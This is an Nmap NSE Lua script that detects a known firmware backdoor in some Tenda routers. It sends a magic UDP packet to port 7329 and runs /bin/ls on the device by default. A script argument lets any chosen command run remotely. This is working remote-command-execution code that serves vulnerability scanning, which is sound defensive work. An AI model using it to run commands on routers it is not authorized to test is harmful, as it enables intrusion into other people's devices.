description = [[
Detects a firmware backdoor on some Tenda routers by connecting to a UDP port
7329 and executing a command. By default, it executes /bin/ls and checks 
for the expected output.

Some of the vulnerable routers are W302R and  W330R as well as re-branded models,
such as the Medialink MWN-WAPR150N. They all use the same “w302r_mfg” magic 
packet string.

Other Tenda routers are possibly affected.

Discovered by Craig of /dev/ttyS0 (http://www.devttys0.com/).

Reference: http://www.devttys0.com/2013/10/from-china-with-love/
List of other possibly affected firmware versions:
http://ea.github.io/blog/2013/10/18/tenda-backdoor/

]]

---
-- @usage
-- nmap -sU -p 7329 --script tenda-backdoor <target>
--
-- @output
-- PORT     STATE         SERVICE REASON
-- 7329/udp open|filtered swx     no-response
-- | tenda-backdoor:
-- |   VULNERABLE:
-- |   Firmware backdoor in some models of Tenda routers allow for remote command execution
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       Tenda routers have been found to contain a firmware backdoor  allowing remote command execution by using a magic word on udp port 7329.
-- |
-- |     References:
-- |_      http://www.devttys0.com/2013/10/from-china-with-love/
--
-- @args tenda-backdoor.command  Command to execute on the router (need absolute path)

author = "Aleksandar Nikolic"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local comm = require "comm"
local bin = require "bin"

portrule = shortport.portnumber({7329},"udp")
local arg_command = stdnse.get_script_args(SCRIPT_NAME .. ".command")

action = function(host, port)
	local magic_string = "w302r_mfg" .. bin.pack("c",0) .. "x"
	if not arg_command then
		arg_command = "/bin/ls"
	end
	local status, result = comm.exchange(host, port,magic_string .. arg_command,{proto="udp"})
	
	local vuln_table = {
		title = "Firmware backdoor in some models of Tenda routers allow for remote command execution",
		state = vulns.STATE.NOT_VULN,
		risk_factor = "High",
		description = [[
Tenda routers have been found to contain a firmware backdoor  allowing remote command execution by using a magic word on udp port 7329.
]],
		references = {
		'http://www.devttys0.com/2013/10/from-china-with-love/',
		}
	}
    
    if not status then
		return
	end
	stdnse.print_debug(1,"result\n:"..result)
	if result:find("etc_ro") then
			vuln_table.state = vulns.STATE.VULN
			local report = vulns.Report:new(SCRIPT_NAME, host, port)
			return report:make_output(vuln_table) 
	end

	return
end
